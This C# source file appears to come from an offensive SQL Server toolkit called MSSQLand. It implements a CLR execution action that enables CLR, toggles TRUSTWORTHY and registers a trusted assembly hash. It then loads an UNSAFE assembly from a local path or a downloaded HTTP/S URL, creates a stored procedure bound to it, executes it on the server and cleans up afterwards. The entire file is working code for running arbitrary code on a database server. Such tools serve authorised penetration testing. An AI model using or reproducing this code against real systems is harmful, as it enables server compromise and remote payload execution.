using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using MSSQLand.Utilities;
using MSSQLand.Services;

namespace MSSQLand.Actions.Execution
{
    internal class ClrExecution : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "DLL URI (local path or HTTP/S URL)")]
        private string _dllURI = string.Empty;
        
        [ArgumentMetadata(Position = 1, Description = "Function name to execute (default: Main)")]
        private string _function = "Main";

        public override void ValidateArguments(string[] args)
        {
            // Automatic binding
            BindArgumentsToFields(args);

            if (string.IsNullOrEmpty(_dllURI))
            {
                throw new ArgumentException("DLL URI is required. Usage: <dllURI> [function]");
            }

            if (string.IsNullOrEmpty(_function))
            {
                _function = "Main";
            }
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            // Step 1: Get the SHA-512 hash for the DLL and its bytes.
            string[] library = ConvertDLLToSQLBytes(_dllURI);

            if (library.Length != 2 || string.IsNullOrEmpty(library[0]) || string.IsNullOrEmpty(library[1]))
            {
                Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
                return false;
            }

            if (!databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1))
            {
                return false;
            }

            string libraryHash = library[0];
            string libraryHexBytes = library[1];

            Logger.Info($"SHA-512 Hash: {libraryHash}");
            Logger.Info($"DLL Bytes Length: {libraryHexBytes.Length}");

            string assemblyName = Guid.NewGuid().ToString("N").Substring(0, 6);
            string libraryPath = Guid.NewGuid().ToString("N").Substring(0, 6);

            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}];";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assemblyName}];";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";

            Logger.Task("Starting CLR assembly deployment process");

            try
            {
                if (databaseContext.Server.Legacy)
                {
                    Logger.Info("Legacy server detected. Enabling TRUSTWORTHY property");
                    databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE [{databaseContext.QueryService.ExecutionDatabase}] SET TRUSTWORTHY ON;");
                }

                if (!databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, libraryPath))
                {
                    return false;
                }

                // Drop existing procedure and assembly if they exist
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);

                // Step 3: Create the assembly from the DLL bytes
                Logger.Task("Creating the assembly from DLL bytes");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");

                if (!databaseContext.ConfigService.CheckAssembly(assemblyName))
                {
                    Logger.Error("Failed to create a new assembly");
                    return false;
                }

                Logger.Success($"Assembly '{assemblyName}' successfully created");

                // Step 4: Create the stored procedure linked to the assembly
                Logger.Task("Creating the stored procedure linked to the assembly");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assemblyName}].[StoredProcedures].[{_function}];");

                if (!databaseContext.ConfigService.CheckProcedures(_function))
                {
                    Logger.Error("Failed to create the stored procedure");
                    return false;
                }

                Logger.Success($"Stored procedure '{_function}' successfully created");

                // Step 5: Execute the stored procedure
                Logger.Task($"Executing the stored procedure '{_function}'");
                databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
                Logger.Success("Stored procedure executed successfully");

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
                return false;
            }
            finally
            {
                // Cleanup (always executed)
                Logger.Task("Performing cleanup");
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);

                if (databaseContext.Server.Legacy)
                {
                    Logger.Info("Resetting TRUSTWORTHY property");
                    databaseContext.QueryService.ExecuteNonProcessing(
                        $"ALTER DATABASE [{databaseContext.QueryService.ExecutionDatabase}] SET TRUSTWORTHY OFF;");
                }
            }
        }


        /// <summary>
        /// Reads a .NET assembly (.dll) from the local filesystem, computes its SHA-512 hash,
        /// and converts its binary content into a SQL-compatible hexadecimal string format.
        ///
        /// This method uses the <c>File.ReadAllBytes</c> method to read the entire file content into memory.
        /// For very large DLLs, consider using a streaming approach to avoid high memory usage.
        ///
        /// This method returns:
        /// <list type="number">
        ///   <item>
        ///     <description>
        ///     <b>SHA-512 hash (lowercase hex)</b>: Used with <c>sp_add_trusted_assembly</c>.
        ///     Format: 128-character lowercase hexadecimal string.
        ///     </description>
        ///   </item>
        ///   <item>
        ///     <description>
        ///     <b>DLL bytes (uppercase hex)</b>: Used with <c>CREATE ASSEMBLY FROM 0x...</c>.
        ///     Format: 2 characters per byte, uppercase hexadecimal string.
        ///     </description>
        ///   </item>
        /// </list>
        ///
        /// </summary>
        /// <param name="dll">Full path to the DLL on disk.</param>
        /// <returns>
        /// A string array with:
        /// <c>[0]</c> = SHA-512 hash (lowercase hex), <c>[1]</c> = DLL content (uppercase hex).
        /// </returns>
        private static string[] ConvertDLLToSQLBytesFile(string dll)
        {
            string[] dllArr = new string[2];

            try
            {
                FileInfo fileInfo = new(dll);
                Logger.Info($"{dll} is {fileInfo.Length} bytes.");

                // Read all DLL bytes first
                byte[] dllBytes = File.ReadAllBytes(dll);

                // Compute SHA-512 hash of the file
                byte[] hashBytes;
                using (SHA512 sha512 = SHA512.Create())
                using (FileStream fileStream = File.OpenRead(dll))
                {
                    hashBytes = sha512.ComputeHash(fileStream);
                }

                // Allocate character arrays for hex strings
                char[] hashChars = new char[hashBytes.Length * 2];       // Lowercase hex
                char[] dllHexChars = new char[dllBytes.Length * 2];      // Uppercase hex

                // Fill hash hex chars
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    byte b = hashBytes[i];
                    hashChars[i * 2] = Misc.GetHexChar((b >> 4) & 0xF, false);
                    hashChars[i * 2 + 1] = Misc.GetHexChar(b & 0xF, false);
                }

                // Fill DLL hex chars
                for (int i = 0; i < dllBytes.Length; i++)
                {
                    byte b = dllBytes[i];
                    dllHexChars[i * 2] = Misc.GetHexChar((b >> 4) & 0xF, true);
                    dllHexChars[i * 2 + 1] = Misc.GetHexChar(b & 0xF, true);
                }

                // Assign results
                dllArr[0] = new string(hashChars);     // lowercase hash
                dllArr[1] = new string(dllHexChars);   // uppercase bytes
            }
            catch (FileNotFoundException)
            {
                Logger.Error($"Unable to load {dll}");
                dllArr[0] = string.Empty;
                dllArr[1] = string.Empty;
            }

            return dllArr;
        }


        /// <summary>
        /// Downloads a .NET assembly from a remote HTTP/S location and converts it
        /// to SQL-compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll">The URL of the DLL to download.</param>
        /// <returns>An array containing the SHA-512 hash and SQL-compatible byte string.</returns>
        private static string[] ConvertDLLToSQLBytesWeb(string dll)
        {
            try
            {
                // Ensure a valid URL is provided
                if (string.IsNullOrWhiteSpace(dll) || (!dll.StartsWith("http://") && !dll.StartsWith("https://")))
                {
                    throw new ArgumentException($"Invalid DLL URL: {dll}");
                }

                Logger.Info($"Downloading DLL from {dll}");

                // Set up secure protocols for downloading the DLL
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

                // Download the DLL content
                byte[] dllBytes;
                using (var client = new WebClient())
                {
                    dllBytes = client.DownloadData(dll);
                }

                Logger.Info($"DLL downloaded successfully, size: {dllBytes.Length} bytes");

                // Compute the SHA-512 hash
                string dllHash;
                using (var sha512 = SHA512.Create())
                {
                    dllHash = BitConverter.ToString(sha512.ComputeHash(dllBytes)).Replace("-", "").ToLower();
                }

                Logger.Info($"SHA-512 hash computed: {dllHash}");

                // Convert the DLL bytes to a SQL-compatible hexadecimal string
                string dllHexString = BitConverter.ToString(dllBytes).Replace("-", "").ToUpper();

                return new[] { dllHash, dllHexString };
            }
            catch (WebException ex)
            {
                Logger.Error($"Failed to download DLL from {dll}. Web exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                Logger.Error($"An error occurred while processing the DLL: {ex.Message}");
            }

            // Return empty values in case of failure
            return new[] { string.Empty, string.Empty };
        }

        /// <summary>
        /// This method determines if the .NET assembly resides locally
        /// on disk, or remotely on a web server.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytes(string dll)
        {
            string[] dllArr = dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://")
            ? ConvertDLLToSQLBytesWeb(dll)
            : ConvertDLLToSQLBytesFile(dll);

            return dllArr;
        }
    }
}
